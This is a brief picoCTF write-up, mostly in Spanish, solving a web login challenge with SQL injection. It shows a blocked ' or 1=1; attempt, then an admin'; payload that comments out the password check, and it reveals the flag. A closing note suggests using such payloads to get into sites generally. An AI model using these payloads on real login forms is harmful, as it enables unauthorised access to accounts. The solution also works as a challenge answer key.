## Objetivo
`https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849
## Solución
```
username: ' or 1=1;
password: Hola
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='Hola'

# SQLi detected.

Cambiamos de estrategia:
username: admin';
password: Hola
SQL query: SELECT * FROM users WHERE name='admin';' AND password='Hola'

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_fa983901}
Nos da la bandera ya que solo verifica el username y no el password
```
## Notas adicionales
Podemos usar payloads de sql injection para intentar entrar a los sitios
## Referencias